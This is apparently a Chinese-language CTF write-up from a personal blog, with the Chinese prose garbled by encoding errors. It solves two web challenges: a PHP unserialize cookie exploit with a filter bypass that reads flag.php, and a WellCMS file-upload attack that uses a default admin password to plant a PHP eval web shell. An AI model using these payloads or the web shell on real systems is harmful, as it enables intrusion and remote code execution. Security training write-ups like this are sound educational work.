<p>å‚è€ƒï¼š<a href="http://iv4n.cc/2020-wp-vol1/#templatejs" target="_blank" rel="noopener">http://iv4n.cc/2020-wp-vol1/#templatejs</a></p>
<h2 id="Hodor"><a href="#Hodor" class="headerlink" title="Hodor"></a>Hodor</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gk1m5ff1awj30de033t8j.jpg" alt=""></p>
<p>æŸ¥çœ‹æºç è·å¾—æç¤ºã€‚</p>
<pre><code>&lt;?php

Class Source {
public function __toString() {
    return highlight_file(&apos;license.txt&apos;, true).highlight_file($this-&gt;source, true);
}
}

function easy_check($str) {
//echo $str;
if (preg_match(&quot;/flag/i&quot;, $str, $matches)) {
    return false;
}
return true;
}

if(isset($_GET[&apos;source&apos;])){
$s = new Source();
$s-&gt;source = __FILE__;

echo $s;
exit;
}

$todos = [];

if(isset($_COOKIE[&apos;todos&apos;])){
if(!easy_check($_COOKIE[&apos;todos&apos;])) {
    echo &quot;Hacker!\n&quot;;
} else {
    $c = $_COOKIE[&apos;todos&apos;];
    $h = substr($c, 0, 32);
    $m = substr($c, 32);
    if(md5($m) === $h){
        $todos = unserialize($m);
    }
}
}

if(isset($_POST[&apos;text&apos;])){
$todo = $_POST[&apos;text&apos;];

$todos[] = $todo;
$m = serialize($todos);
$h = md5($m);

setcookie(&apos;todos&apos;, $h.$m);
header(&apos;Location: &apos;.$_SERVER[&apos;REQUEST_URI&apos;]);
exit;
}
// flag is in flag.php
?&gt;
&lt;?php foreach($todos as $todo):?&gt;
&lt;li&gt;&lt;?=$todo?&gt;&lt;/li&gt;
&lt;?php endforeach;?&gt;</code></pre><p>å‘ç°å’Œ <a href="https://blog.csdn.net/weixin_43415644/article/details/94590443" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43415644/article/details/94590443</a>çš„ç±»ä¼¼ï¼Œåªæ˜¯è¿‡æ»¤äº†flagã€‚</p>
<pre><code>&lt;?php
Class Source {
public function __toString() {
    highlight_file(&apos;license.txt&apos;, true).highlight_file($this-&gt;source, true);
}
}
if(isset($_GET[&apos;source&apos;])){
$s = new Source();
$s-&gt;source = &quot;flag.php&quot;;
$s=[$s];
$m=serialize($s);
echo $m;
}
?&gt;</code></pre><p>ç›´æ¥å†™è„šæœ¬ï¼Œè·å¾—</p>
<pre><code>a:1:{i:0;O:6:&quot;Source&quot;:1:{s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;}}</code></pre><p>å…¶ä¸­flagè¢«è¿‡æ»¤äº†,æ‰€ä»¥æ„é€ </p>
<pre><code>a:1:{i:0;O:6:&quot;Source&quot;:1:{s:6:&quot;source&quot;;S:8:&quot;\66lag.php&quot;;}}</code></pre><p>ç»•è¿‡<br>æœ€åçš„payload:</p>
<pre><code>df80635527eb9189c1197254ad3c46bca%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Source%22%3A1%3A%7Bs%3A6%3A%22source%22%3BS%3A8%3A%22%5C66lag.php%22%3B%7D%7D</code></pre><p>æ·»åŠ cookie todosä¸ºpayloadï¼Œç„¶ååˆ·æ–°ä¸€ä¸‹é¡µé¢è·å¾—flagã€‚</p>
<h2 id="WellCMS"><a href="#WellCMS" class="headerlink" title="WellCMS"></a>WellCMS</h2><p>ç»è¿‡æµ‹è¯•adminçš„å¯†ç ä¸ºadmin123ï¼Œç™»å½•åç„¶åå†æ¬¡è¾“å…¥å¯†ç è¿›å…¥åå°ç®¡ç†ç³»ç»Ÿã€‚æ–°å¢åŠ ä¸€ä¸ªå†…å®¹ï¼Œç„¶åä¸Šä¼ å›¾ç‰‡ã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gk1qm67qs5j30et0cpwg1.jpg" alt=""><br>æŠ“åŒ…åˆ†æå‘ç°filetypeä¸ºjpegï¼Œdataä¸ºå›¾ç‰‡çš„base64ç¼–ç ã€‚<br>filetypeä¿®æ”¹ä¸ºphpï¼Œ<br>dataä¿®æ”¹ä¸ºï¼š</p>
<pre><code>data:image/jpeg;base64,PD9waHAgQGV2YWwoJF9QT1NUWydoYWNrJ10pO2V2YWwocGhwaW5mbygpKTs/Pg==
&lt;?php @eval($_POST[&apos;hack&apos;]);eval(phpinfo());?&gt;</code></pre><p>ç„¶åä¸Šä¼ ï¼Œæ¥ç€æ‰“å¼€ä¸Šä¼ æ–‡ä»¶<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gk1quv0f3fj30vh0mrtat.jpg" alt=""><br>æˆåŠŸè¿è¡Œã€‚æ¥ç€ç”¨èšå‰‘è¿æ¥ã€‚åœ¨æ ¹ç›®å½•ä¸‹è·å¾—flagã€‚</p>
<p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/0daybug/p/12393857.html" target="_blank" rel="noopener">https://www.cnblogs.com/0daybug/p/12393857.html</a></p>

      <blockquote class="mdui-m-t-5">
        
        <strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="https://devildragons.github.io/2020/10/26/10%E6%9C%88%E6%A0%A1%E8%B5%9B/">https://devildragons.github.io/2020/10/26/10%E6%9C%88%E6%A0%A1%E8%B5%9B/</a>
      </blockquote>
      
    </div>
    <footer class="mdui-card-actions">
      
        <a class="mdui-ripple article_categories-link" href="/categories/web/">web</a>
      
      
        <a class="mdui-ripple article_tags-link" href="/tags/cumt/" rel="tag">cumt</a>
      
    </footer>
    
  </article>
  
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>

  <script>$("#main article .mdui-card-content img.fancybox").on("click",function(e){$.fancybox.open({src:$(this).attr("src")});});</script>


  <nav id="paginator">
    
    <div class="spacer"></div>
    
      <a rel="next" class="extend next" href="/2020/09/25/CUMTCTF2020/">
        ä¸‹ä¸€ç¯‡&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <button aria-label="next" class="mdui-btn mdui-btn-raised mdui-btn-dense mdui-btn-icon mdui-color-theme-accent mdui-ripple"><i class="mdui-icon material-icons">arrow_forward</i></button>
      </a>
    
  </nav>




<!-- æ¥å¿…åŠ›Cityç‰ˆå®‰è£…ä»£ç  -->
<div id="lv-container" data-id="city" data-uid="MTAyMC81MTU2OC8yODA0OQ==">
<script type="text/javascript">
   (function(d, s) {
       var j, e = d.getElementsByTagName(s)[0];

       if (typeof LivereTower === 'function') { return; }

       j = d.createElement(s);
       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
       j.async = true;

       e.parentNode.insertBefore(j, e);
   })(document, 'script');
</script>
<noscript>ä¸ºæ­£å¸¸ä½¿ç”¨æ¥å¿…åŠ›è¯„è®ºåŠŸèƒ½è¯·æ¿€æ´»JavaScript</noscript>
</div>
<!-- Cityç‰ˆå®‰è£…ä»£ç å·²å®Œæˆ --></main>
  <footer id="footer" class="mdui-m-t-5 mdui-p-y-3 mdui-color-theme">
  <div class="mdui-p-y-0 mdui-text-center">
    
    
    
    
    
    
    
    
    
    
    
    
  </div>
  <div class="mdui-p-y-1 mdui-text-center">
    Copyright &copy; 2019 - 2020 ç¬é­”é¾™<br>
    Powered by <a href="https://hexo.io/" target="_blank" class="mdui-text-color-theme-accent">Hexo</a>
    
        <!-- ä¸è’œå­ç»Ÿè®¡ -->
        <span id="busuanzi_container_site_pv">
                æœ¬ç«™æ€»è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡
        </span>
        <span class="post-meta-divider">|</span>
        <span id="busuanzi_container_site_uv" style='display:none'>
                æœ¬ç«™è®¿å®¢æ•°<span id="busuanzi_value_site_uv"></span>äºº
        </span>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  
  </div>
</footer>
  <button id="gotop" class="mdui-fab mdui-fab-fixed mdui-fab-hide mdui-ripple mdui-color-theme-accent"><i class="mdui-icon material-icons">arrow_upward</i></button>
  
  
<script src="/js/mdui.js"></script>
<script src="/js/script.js"></script>

</body>
</html>